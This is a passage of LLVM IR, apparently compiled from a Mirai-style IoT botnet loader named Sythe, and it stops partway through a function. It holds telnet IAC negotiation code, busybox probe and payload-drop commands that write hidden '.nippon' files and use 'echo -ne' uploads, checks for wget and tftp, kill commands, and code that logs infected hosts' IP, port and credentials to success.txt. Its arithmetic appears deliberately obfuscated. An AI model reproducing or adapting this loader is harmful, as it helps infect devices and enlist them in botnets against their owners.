; ModuleID = 'host/ir_sub/Sythe.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.connection = type { %union.pthread_mutex_t, %struct.server*, %struct.binary*, %struct.telnet_info, i32, i32, i64, i32, %struct.anon, i16, i16, i8, i8, i8, i8, [8192 x i8] }
%union.pthread_mutex_t = type { %struct.__pthread_mutex_s }
%struct.__pthread_mutex_s = type { i32, i32, i32, i32, i32, i16, i16, %struct.__pthread_internal_list }
%struct.__pthread_internal_list = type { %struct.__pthread_internal_list*, %struct.__pthread_internal_list* }
%struct.server = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i8*, i8*, %struct.server_worker*, %struct.connection**, i32*, i64, i16, i8, i8, i32 }
%struct.server_worker = type { %struct.server*, i32, i64, i8 }
%struct.binary = type { [6 x i8], i32, i8** }
%struct.telnet_info = type { [32 x i8], [32 x i8], [6 x i8], [32 x i8], i32, i16, i32, i8, i8 }
%struct.anon = type { [512 x i8], i32 }
%struct.elf_hdr = type { [16 x i8], i16, i16, i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }

@fileeeee = common global %struct._IO_FILE* null, align 8
@.str = private unnamed_addr constant [13 x i8] c"srv == NULL\0A\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.1 = private unnamed_addr constant [42 x i8] c"Payload Sent --> %d.%d.%d.%d:%d %s:%s %s\0A\00", align 1
@.str.2 = private unnamed_addr constant [12 x i8] c"success.txt\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"%d.%d.%d.%d:%d %s:%s\0A\00", align 1
@connection_consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@connection_consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"enter\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@.str.8 = private unnamed_addr constant [24 x i8] c"ECCHI: applet not found\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"init\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"[init]\00", align 1
@.str.11 = private unnamed_addr constant [26 x i8] c"/bin/busybox kill -9 %d\0D\0A\00", align 1
@.str.12 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"rw\00", align 1
@.str.14 = private unnamed_addr constant [100 x i8] c"/bin/busybox echo -e '%s%s' > %s/.nippon; /bin/busybox cat %s/.nippon; /bin/busybox rm %s/.nippon\0D\0A\00", align 1
@.str.15 = private unnamed_addr constant [17 x i8] c"\5Cx6b\5Cx61\5Cx6d\5Cx69\00", align 1
@.str.16 = private unnamed_addr constant [108 x i8] c"/bin/busybox echo -e '%s/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon\0D\0A\00", align 1
@.str.17 = private unnamed_addr constant [21 x i8] c"/bin/busybox ECCHI\0D\0A\00", align 1
@.str.18 = private unnamed_addr constant [5 x i8] c"kami\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.20 = private unnamed_addr constant [36 x i8] c"rm %s/.t; rm %s/.sh; rm %s/.human\0D\0A\00", align 1
@.str.21 = private unnamed_addr constant [4 x i8] c"ELF\00", align 1
@.str.22 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.23 = private unnamed_addr constant [5 x i8] c"mpsl\00", align 1
@.str.24 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.25 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.26 = private unnamed_addr constant [4 x i8] c"spc\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"m68k\00", align 1
@.str.28 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.29 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.30 = private unnamed_addr constant [6 x i8] c"ARMv7\00", align 1
@.str.31 = private unnamed_addr constant [6 x i8] c"ARMv6\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"arm7\00", align 1
@.str.33 = private unnamed_addr constant [23 x i8] c"wget: applet not found\00", align 1
@.str.34 = private unnamed_addr constant [23 x i8] c"tftp: applet not found\00", align 1
@.str.36 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.37 = private unnamed_addr constant [3 x i8] c">>\00", align 1
@.str.35 = private unnamed_addr constant [44 x i8] c"echo -ne '%s' %s upnp; /bin/busybox ECCHI\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [18 x i8] c"Permission denied\00", align 1
@.str.39 = private unnamed_addr constant [8 x i8] c"timeout\00", align 1
@.str.40 = private unnamed_addr constant [15 x i8] c"illegal option\00", align 1
@.str.41 = private unnamed_addr constant [24 x i8] c"IHCCE: applet not found\00", align 1
@.str.42 = private unnamed_addr constant [15 x i8] c"listening tun0\00", align 1

; Function Attrs: noinline nounwind uwtable
define void @connection_open(%struct.connection*) #0 {
  %2 = alloca %struct.connection*, align 8
  store %struct.connection* %0, %struct.connection** %2, align 8
  %3 = load %struct.connection*, %struct.connection** %2, align 8
  %4 = getelementptr inbounds %struct.connection, %struct.connection* %3, i32 0, i32 0
  %5 = call i32 @pthread_mutex_lock(%union.pthread_mutex_t* %4) #5
  %6 = load %struct.connection*, %struct.connection** %2, align 8
  %7 = getelementptr inbounds %struct.connection, %struct.connection* %6, i32 0, i32 9
  store i16 0, i16* %7, align 8
  %8 = call i64 @time(i64* null) #5
  %9 = load %struct.connection*, %struct.connection** %2, align 8
  %10 = getelementptr inbounds %struct.connection, %struct.connection* %9, i32 0, i32 6
  store i64 %8, i64* %10, align 8
  %11 = load %struct.connection*, %struct.connection** %2, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 10
  store i16 10, i16* %12, align 2
  %13 = load %struct.connection*, %struct.connection** %2, align 8
  %14 = getelementptr inbounds %struct.connection, %struct.connection* %13, i32 0, i32 5
  store i32 0, i32* %14, align 4
  %15 = load %struct.connection*, %struct.connection** %2, align 8
  %16 = getelementptr inbounds %struct.connection, %struct.connection* %15, i32 0, i32 7
  store i32 1, i32* %16, align 8
  %17 = load %struct.connection*, %struct.connection** %2, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 12
  store i8 0, i8* %18, align 1
  %19 = load %struct.connection*, %struct.connection** %2, align 8
  %20 = getelementptr inbounds %struct.connection, %struct.connection* %19, i32 0, i32 11
  store i8 1, i8* %20, align 4
  %21 = load %struct.connection*, %struct.connection** %2, align 8
  %22 = getelementptr inbounds %struct.connection, %struct.connection* %21, i32 0, i32 2
  store %struct.binary* null, %struct.binary** %22, align 8
  %23 = load %struct.connection*, %struct.connection** %2, align 8
  %24 = getelementptr inbounds %struct.connection, %struct.connection* %23, i32 0, i32 5
  store i32 0, i32* %24, align 4
  %25 = load %struct.connection*, %struct.connection** %2, align 8
  %26 = getelementptr inbounds %struct.connection, %struct.connection* %25, i32 0, i32 0
  %27 = call i32 @pthread_mutex_unlock(%union.pthread_mutex_t* %26) #5
  ret void
}

; Function Attrs: nounwind
declare i32 @pthread_mutex_lock(%union.pthread_mutex_t*) #1

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @pthread_mutex_unlock(%union.pthread_mutex_t*) #1

; Function Attrs: noinline nounwind uwtable
define void @connection_close(%struct.connection*) #0 {
  %2 = alloca %struct.connection*, align 8
  store %struct.connection* %0, %struct.connection** %2, align 8
  %3 = load %struct.connection*, %struct.connection** %2, align 8
  %4 = getelementptr inbounds %struct.connection, %struct.connection* %3, i32 0, i32 0
  %5 = call i32 @pthread_mutex_lock(%union.pthread_mutex_t* %4) #5
  %6 = load %struct.connection*, %struct.connection** %2, align 8
  %7 = getelementptr inbounds %struct.connection, %struct.connection* %6, i32 0, i32 11
  %8 = load i8, i8* %7, align 4
  %9 = icmp ne i8 %8, 0
  br i1 %9, label %10, label %172

; <label>:10:                                     ; preds = %1
  %11 = load %struct.connection*, %struct.connection** %2, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 8
  %13 = getelementptr inbounds %struct.anon, %struct.anon* %12, i32 0, i32 0
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %13, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 512, i32 4, i1 false)
  %15 = load %struct.connection*, %struct.connection** %2, align 8
  %16 = getelementptr inbounds %struct.connection, %struct.connection* %15, i32 0, i32 8
  %17 = getelementptr inbounds %struct.anon, %struct.anon* %16, i32 0, i32 1
  store i32 0, i32* %17, align 4
  %18 = load %struct.connection*, %struct.connection** %2, align 8
  %19 = getelementptr inbounds %struct.connection, %struct.connection* %18, i32 0, i32 6
  store i64 0, i64* %19, align 8
  %20 = load %struct.connection*, %struct.connection** %2, align 8
  %21 = getelementptr inbounds %struct.connection, %struct.connection* %20, i32 0, i32 11
  store i8 0, i8* %21, align 4
  %22 = load %struct.connection*, %struct.connection** %2, align 8
  %23 = getelementptr inbounds %struct.connection, %struct.connection* %22, i32 0, i32 13
  store i8 0, i8* %23, align 2
  %24 = load %struct.connection*, %struct.connection** %2, align 8
  %25 = getelementptr inbounds %struct.connection, %struct.connection* %24, i32 0, i32 14
  store i8 0, i8* %25, align 1
  %26 = load %struct.connection*, %struct.connection** %2, align 8
  %27 = getelementptr inbounds %struct.connection, %struct.connection* %26, i32 0, i32 15
  %28 = getelementptr inbounds [8192 x i8], [8192 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8192, i32 8, i1 false)
  %29 = load %struct.connection*, %struct.connection** %2, align 8
  %30 = getelementptr inbounds %struct.connection, %struct.connection* %29, i32 0, i32 9
  store i16 0, i16* %30, align 8
  %31 = load %struct.connection*, %struct.connection** %2, align 8
  %32 = getelementptr inbounds %struct.connection, %struct.connection* %31, i32 0, i32 1
  %33 = load %struct.server*, %struct.server** %32, align 8
  %34 = icmp eq %struct.server* %33, null
  br i1 %34, label %35, label %37

; <label>:35:                                     ; preds = %10
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0))
  br label %195

; <label>:37:                                     ; preds = %10
  %38 = load %struct.connection*, %struct.connection** %2, align 8
  %39 = getelementptr inbounds %struct.connection, %struct.connection* %38, i32 0, i32 12
  %40 = load i8, i8* %39, align 1
  %41 = icmp ne i8 %40, 0
  br i1 %41, label %42, label %165

; <label>:42:                                     ; preds = %37
  %43 = load %struct.connection*, %struct.connection** %2, align 8
  %44 = getelementptr inbounds %struct.connection, %struct.connection* %43, i32 0, i32 1
  %45 = load %struct.server*, %struct.server** %44, align 8
  %46 = getelementptr inbounds %struct.server, %struct.server* %45, i32 0, i32 7
  %47 = atomicrmw add i32* %46, i32 1 seq_cst
  %48 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %49 = load %struct.connection*, %struct.connection** %2, align 8
  %50 = getelementptr inbounds %struct.connection, %struct.connection* %49, i32 0, i32 3
  %51 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %50, i32 0, i32 4
  %52 = load i32, i32* %51, align 8
  %53 = xor i32 255, -1
  %54 = xor i32 %52, %53
  %55 = and i32 %54, %52
  %56 = and i32 %52, 255
  %57 = load %struct.connection*, %struct.connection** %2, align 8
  %58 = getelementptr inbounds %struct.connection, %struct.connection* %57, i32 0, i32 3
  %59 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %58, i32 0, i32 4
  %60 = load i32, i32* %59, align 8
  %61 = lshr i32 %60, 8
  %62 = xor i32 255, -1
  %63 = xor i32 %61, %62
  %64 = and i32 %63, %61
  %65 = and i32 %61, 255
  %66 = load %struct.connection*, %struct.connection** %2, align 8
  %67 = getelementptr inbounds %struct.connection, %struct.connection* %66, i32 0, i32 3
  %68 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %67, i32 0, i32 4
  %69 = load i32, i32* %68, align 8
  %70 = lshr i32 %69, 16
  %71 = xor i32 255, -1
  %72 = xor i32 %70, %71
  %73 = and i32 %72, %70
  %74 = and i32 %70, 255
  %75 = load %struct.connection*, %struct.connection** %2, align 8
  %76 = getelementptr inbounds %struct.connection, %struct.connection* %75, i32 0, i32 3
  %77 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %76, i32 0, i32 4
  %78 = load i32, i32* %77, align 8
  %79 = lshr i32 %78, 24
  %80 = xor i32 255, -1
  %81 = xor i32 %79, %80
  %82 = and i32 %81, %79
  %83 = and i32 %79, 255
  %84 = load %struct.connection*, %struct.connection** %2, align 8
  %85 = getelementptr inbounds %struct.connection, %struct.connection* %84, i32 0, i32 3
  %86 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %85, i32 0, i32 5
  %87 = load i16, i16* %86, align 4
  %88 = zext i16 %87 to i32
  %89 = call i32 (i32, ...) bitcast (i32 (...)* @ntohs to i32 (i32, ...)*)(i32 %88)
  %90 = load %struct.connection*, %struct.connection** %2, align 8
  %91 = getelementptr inbounds %struct.connection, %struct.connection* %90, i32 0, i32 3
  %92 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %91, i32 0, i32 0
  %93 = getelementptr inbounds [32 x i8], [32 x i8]* %92, i32 0, i32 0
  %94 = load %struct.connection*, %struct.connection** %2, align 8
  %95 = getelementptr inbounds %struct.connection, %struct.connection* %94, i32 0, i32 3
  %96 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %95, i32 0, i32 1
  %97 = getelementptr inbounds [32 x i8], [32 x i8]* %96, i32 0, i32 0
  %98 = load %struct.connection*, %struct.connection** %2, align 8
  %99 = getelementptr inbounds %struct.connection, %struct.connection* %98, i32 0, i32 3
  %100 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %99, i32 0, i32 2
  %101 = getelementptr inbounds [6 x i8], [6 x i8]* %100, i32 0, i32 0
  %102 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %48, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.1, i32 0, i32 0), i32 %55, i32 %64, i32 %73, i32 %82, i32 %89, i8* %93, i8* %97, i8* %101)
  %103 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i32 0, i32 0))
  store %struct._IO_FILE* %103, %struct._IO_FILE** @fileeeee, align 8
  %104 = load %struct._IO_FILE*, %struct._IO_FILE** @fileeeee, align 8
  %105 = load %struct.connection*, %struct.connection** %2, align 8
  %106 = getelementptr inbounds %struct.connection, %struct.connection* %105, i32 0, i32 3
  %107 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %106, i32 0, i32 4
  %108 = load i32, i32* %107, align 8
  %109 = xor i32 %108, -1
  %110 = xor i32 255, -1
  %111 = xor i32 -745636570, -1
  %112 = or i32 %109, %110
  %113 = or i32 -745636570, %111
  %114 = xor i32 %112, -1
  %115 = and i32 %114, %113
  %116 = and i32 %108, 255
  %117 = load %struct.connection*, %struct.connection** %2, align 8
  %118 = getelementptr inbounds %struct.connection, %struct.connection* %117, i32 0, i32 3
  %119 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %118, i32 0, i32 4
  %120 = load i32, i32* %119, align 8
  %121 = lshr i32 %120, 8
  %122 = xor i32 255, -1
  %123 = xor i32 %121, %122
  %124 = and i32 %123, %121
  %125 = and i32 %121, 255
  %126 = load %struct.connection*, %struct.connection** %2, align 8
  %127 = getelementptr inbounds %struct.connection, %struct.connection* %126, i32 0, i32 3
  %128 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %127, i32 0, i32 4
  %129 = load i32, i32* %128, align 8
  %130 = lshr i32 %129, 16
  %131 = xor i32 255, -1
  %132 = xor i32 %130, %131
  %133 = and i32 %132, %130
  %134 = and i32 %130, 255
  %135 = load %struct.connection*, %struct.connection** %2, align 8
  %136 = getelementptr inbounds %struct.connection, %struct.connection* %135, i32 0, i32 3
  %137 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %136, i32 0, i32 4
  %138 = load i32, i32* %137, align 8
  %139 = lshr i32 %138, 24
  %140 = xor i32 %139, -1
  %141 = xor i32 255, -1
  %142 = xor i32 858634360, -1
  %143 = or i32 %140, %141
  %144 = or i32 858634360, %142
  %145 = xor i32 %143, -1
  %146 = and i32 %145, %144
  %147 = and i32 %139, 255
  %148 = load %struct.connection*, %struct.connection** %2, align 8
  %149 = getelementptr inbounds %struct.connection, %struct.connection* %148, i32 0, i32 3
  %150 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %149, i32 0, i32 5
  %151 = load i16, i16* %150, align 4
  %152 = zext i16 %151 to i32
  %153 = call i32 (i32, ...) bitcast (i32 (...)* @ntohs to i32 (i32, ...)*)(i32 %152)
  %154 = load %struct.connection*, %struct.connection** %2, align 8
  %155 = getelementptr inbounds %struct.connection, %struct.connection* %154, i32 0, i32 3
  %156 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %155, i32 0, i32 0
  %157 = getelementptr inbounds [32 x i8], [32 x i8]* %156, i32 0, i32 0
  %158 = load %struct.connection*, %struct.connection** %2, align 8
  %159 = getelementptr inbounds %struct.connection, %struct.connection* %158, i32 0, i32 3
  %160 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %159, i32 0, i32 1
  %161 = getelementptr inbounds [32 x i8], [32 x i8]* %160, i32 0, i32 0
  %162 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %104, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i32 0, i32 0), i32 %115, i32 %124, i32 %133, i32 %146, i32 %153, i8* %157, i8* %161)
  %163 = load %struct._IO_FILE*, %struct._IO_FILE** @fileeeee, align 8
  %164 = call i32 @fclose(%struct._IO_FILE* %163)
  br label %171

; <label>:165:                                    ; preds = %37
  %166 = load %struct.connection*, %struct.connection** %2, align 8
  %167 = getelementptr inbounds %struct.connection, %struct.connection* %166, i32 0, i32 1
  %168 = load %struct.server*, %struct.server** %167, align 8
  %169 = getelementptr inbounds %struct.server, %struct.server* %168, i32 0, i32 8
  %170 = atomicrmw add i32* %169, i32 1 seq_cst
  br label %171

; <label>:171:                                    ; preds = %165, %42
  br label %172

; <label>:172:                                    ; preds = %171, %1
  %173 = load %struct.connection*, %struct.connection** %2, align 8
  %174 = getelementptr inbounds %struct.connection, %struct.connection* %173, i32 0, i32 7
  store i32 0, i32* %174, align 8
  %175 = load %struct.connection*, %struct.connection** %2, align 8
  %176 = getelementptr inbounds %struct.connection, %struct.connection* %175, i32 0, i32 4
  %177 = load i32, i32* %176, align 8
  %178 = icmp ne i32 %177, -1
  br i1 %178, label %179, label %191

; <label>:179:                                    ; preds = %172
  %180 = load %struct.connection*, %struct.connection** %2, align 8
  %181 = getelementptr inbounds %struct.connection, %struct.connection* %180, i32 0, i32 4
  %182 = load i32, i32* %181, align 8
  %183 = call i32 (i32, ...) bitcast (i32 (...)* @close to i32 (i32, ...)*)(i32 %182)
  %184 = load %struct.connection*, %struct.connection** %2, align 8
  %185 = getelementptr inbounds %struct.connection, %struct.connection* %184, i32 0, i32 4
  store i32 -1, i32* %185, align 8
  %186 = load %struct.connection*, %struct.connection** %2, align 8
  %187 = getelementptr inbounds %struct.connection, %struct.connection* %186, i32 0, i32 1
  %188 = load %struct.server*, %struct.server** %187, align 8
  %189 = getelementptr inbounds %struct.server, %struct.server* %188, i32 0, i32 1
  %190 = atomicrmw sub i32* %189, i32 1 seq_cst
  br label %191

; <label>:191:                                    ; preds = %179, %172
  %192 = load %struct.connection*, %struct.connection** %2, align 8
  %193 = getelementptr inbounds %struct.connection, %struct.connection* %192, i32 0, i32 0
  %194 = call i32 @pthread_mutex_unlock(%union.pthread_mutex_t* %193) #5
  br label %195

; <label>:195:                                    ; preds = %191, %35
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

declare i32 @printf(i8*, ...) #3

declare i32 @ntohs(...) #3

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

declare i32 @fclose(%struct._IO_FILE*) #3

declare i32 @close(...) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_iacs(%struct.connection*) #0 {
  %2 = alloca %struct.connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.connection* %0, %struct.connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.connection*, %struct.connection** %2, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 15
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  store i8* %10, i8** %4, align 8
  br label %11

; <label>:11:                                     ; preds = %150, %41, %1
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.connection*, %struct.connection** %2, align 8
  %14 = getelementptr inbounds %struct.connection, %struct.connection* %13, i32 0, i32 9
  %15 = load i16, i16* %14, align 8
  %16 = zext i16 %15 to i32
  %17 = icmp slt i32 %12, %16
  br i1 %17, label %18, label %151

; <label>:18:                                     ; preds = %11
  %19 = load i8*, i8** %4, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp ne i32 %21, 255
  br i1 %22, label %23, label %24

; <label>:23:                                     ; preds = %18
  br label %151

; <label>:24:                                     ; preds = %18
  %25 = load i8*, i8** %4, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 255
  br i1 %28, label %29, label %149

; <label>:29:                                     ; preds = %24
  %30 = load %struct.connection*, %struct.connection** %2, align 8
  %31 = load i8*, i8** %4, align 8
  %32 = call signext i8 @can_consume(%struct.connection* %30, i8* %31, i32 1)
  %33 = icmp ne i8 %32, 0
  br i1 %33, label %35, label %34

; <label>:34:                                     ; preds = %29
  br label %151

; <label>:35:                                     ; preds = %29
  %36 = load i8*, i8** %4, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 255
  br i1 %40, label %41, label %48

; <label>:41:                                     ; preds = %35
  %42 = load i8*, i8** %4, align 8
  %43 = getelementptr inbounds i8, i8* %42, i64 2
  store i8* %43, i8** %4, align 8
  %44 = load i32, i32* %3, align 4
  %45 = sub i32 0, 2
  %46 = sub i32 %44, %45
  %47 = add nsw i32 %44, 2
  store i32 %46, i32* %3, align 4
  br label %11

; <label>:48:                                     ; preds = %35
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8, i8* %50, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 253
  br i1 %53, label %54, label %87

; <label>:54:                                     ; preds = %48
  %55 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %55, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @connection_consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %56 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %56, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @connection_consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %57 = load %struct.connection*, %struct.connection** %2, align 8
  %58 = load i8*, i8** %4, align 8
  %59 = call signext i8 @can_consume(%struct.connection* %57, i8* %58, i32 2)
  %60 = icmp ne i8 %59, 0
  br i1 %60, label %62, label %61

; <label>:61:                                     ; preds = %54
  br label %151

; <label>:62:                                     ; preds = %54
  %63 = load i8*, i8** %4, align 8
  %64 = getelementptr inbounds i8, i8* %63, i64 2
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp ne i32 %66, 31
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %62
  br label %88

; <label>:69:                                     ; preds = %62
  %70 = load i8*, i8** %4, align 8
  %71 = getelementptr inbounds i8, i8* %70, i64 3
  store i8* %71, i8** %4, align 8
  %72 = load i32, i32* %3, align 4
  %73 = add i32 %72, 769104341
  %74 = add i32 %73, 3
  %75 = sub i32 %74, 769104341
  %76 = add nsw i32 %72, 3
  store i32 %75, i32* %3, align 4
  %77 = load %struct.connection*, %struct.connection** %2, align 8
  %78 = getelementptr inbounds %struct.connection, %struct.connection* %77, i32 0, i32 4
  %79 = load i32, i32* %78, align 8
  %80 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %81 = call i64 @send(i32 %79, i8* %80, i64 3, i32 16384)
  %82 = load %struct.connection*, %struct.connection** %2, align 8
  %83 = getelementptr inbounds %struct.connection, %struct.connection* %82, i32 0, i32 4
  %84 = load i32, i32* %83, align 8
  %85 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %86 = call i64 @send(i32 %84, i8* %85, i64 9, i32 16384)
  br label %147

; <label>:87:                                     ; preds = %48
  br label %88

; <label>:88:                                     ; preds = %87, %68
  %89 = load %struct.connection*, %struct.connection** %2, align 8
  %90 = load i8*, i8** %4, align 8
  %91 = call signext i8 @can_consume(%struct.connection* %89, i8* %90, i32 2)
  %92 = icmp ne i8 %91, 0
  br i1 %92, label %94, label %93

; <label>:93:                                     ; preds = %88
  br label %151

; <label>:94:                                     ; preds = %88
  store i32 0, i32* %5, align 4
  br label %95

; <label>:95:                                     ; preds = %126, %94
  %96 = load i32, i32* %5, align 4
  %97 = icmp slt i32 %96, 3
  br i1 %97, label %98, label %133

; <label>:98:                                     ; preds = %95
  %99 = load i8*, i8** %4, align 8
  %100 = load i32, i32* %5, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8, i8* %99, i64 %101
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 253
  br i1 %105, label %106, label %111

; <label>:106:                                    ; preds = %98
  %107 = load i8*, i8** %4, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  store i8 -4, i8* %110, align 1
  br label %125

; <label>:111:                                    ; preds = %98
  %112 = load i8*, i8** %4, align 8
  %113 = load i32, i32* %5, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 251
  br i1 %118, label %119, label %124

; <label>:119:                                    ; preds = %111
  %120 = load i8*, i8** %4, align 8
  %121 = load i32, i32* %5, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  store i8 -3, i8* %123, align 1
  br label %124

; <label>:124:                                    ; preds = %119, %111
  br label %125

; <label>:125:                                    ; preds = %124, %106
  br label %126

; <label>:126:                                    ; preds = %125
  %127 = load i32, i32* %5, align 4
  %128 = sub i32 0, %127
  %129 = sub i32 0, 1
  %130 = add i32 %128, %129
  %131 = sub i32 0, %130
  %132 = add nsw i32 %127, 1
  store i32 %131, i32* %5, align 4
  br label %95

; <label>:133:                                    ; preds = %95
  %134 = load %struct.connection*, %struct.connection** %2, align 8
  %135 = getelementptr inbounds %struct.connection, %struct.connection* %134, i32 0, i32 4
  %136 = load i32, i32* %135, align 8
  %137 = load i8*, i8** %4, align 8
  %138 = call i64 @send(i32 %136, i8* %137, i64 3, i32 16384)
  %139 = load i8*, i8** %4, align 8
  %140 = getelementptr inbounds i8, i8* %139, i64 3
  store i8* %140, i8** %4, align 8
  %141 = load i32, i32* %3, align 4
  %142 = sub i32 0, %141
  %143 = sub i32 0, 3
  %144 = add i32 %142, %143
  %145 = sub i32 0, %144
  %146 = add nsw i32 %141, 3
  store i32 %145, i32* %3, align 4
  br label %147

; <label>:147:                                    ; preds = %133, %69
  br label %148

; <label>:148:                                    ; preds = %147
  br label %149

; <label>:149:                                    ; preds = %148, %24
  br label %150

; <label>:150:                                    ; preds = %149
  br label %11

; <label>:151:                                    ; preds = %93, %61, %34, %23, %11
  %152 = load i32, i32* %3, align 4
  ret i32 %152
}

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.connection*, i8*, i32) #0 {
  %4 = alloca %struct.connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.connection* %0, %struct.connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.connection*, %struct.connection** %4, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 15
